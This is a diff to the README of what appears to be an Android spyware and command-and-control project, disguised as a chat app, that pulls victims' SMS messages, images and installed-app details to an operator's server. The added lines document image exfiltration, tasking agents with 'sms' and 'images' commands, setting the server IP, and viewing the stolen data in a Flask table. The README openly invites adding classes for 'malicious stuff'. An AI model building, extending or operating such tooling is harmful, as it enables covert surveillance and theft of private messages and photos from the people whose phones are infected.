@@ -31,6 +31,7 @@ The sqlite database: `database.db`
 ### Tables
 -  agents(id TEXT)
 -  sms(id TEXT, address TEXT, body TEXT, formatted_date TEXT, type INT)
+-  images (id TEXT, path TEXT)
 -  app(id TEXT, package TEXT, sourceDir TEXT, launchActivity TEXT)
   
 ## Client
@@ -52,7 +53,7 @@ Source code in /app/src/main/java/com/example/teamchat/
       ```
   - There's a lot of IO Exception that I do not know how to fix
 - **Constants**
-  - This contains the constant variables
+  - This contains the constant variables. Set your Server IP here.
 - **YourStuff**
   - Add your own class to do your malicious stuff and make a handler in `ChatService` to call it
 
@@ -61,12 +62,19 @@ Source code in /app/src/main/java/com/example/teamchat/
 This probably be updated frequently
 
 - **Main**
-  - list -> lists agents
-  - use <number> -> interact with agent
+  - list -> lists agents.
+  - use [number] -> interact with selected agent
   - clear -> resets the data directory 
 - **Agent**
   - task -> list the current task
-  - do <task> -> writes the task to /task/<id> 
+  - do [task] -> writes the task to /task/<id> 
+    - Available tasks: `sms`, `images`
+
+### View extracted information on Flask
+
+1. Inside the `server` directory, start Flask: `flask --app app run`
+2. Open a browser and go to `https://localhost:5000/[target]"`, where target is the type of information to view (e.g. sms, images).
+3. A table with the desired information and the corresponding agent ID is displayed.
 
 # Extra notes
 I have not cleaned up the code, it has a bunch of prints and logs here and there to make me sane
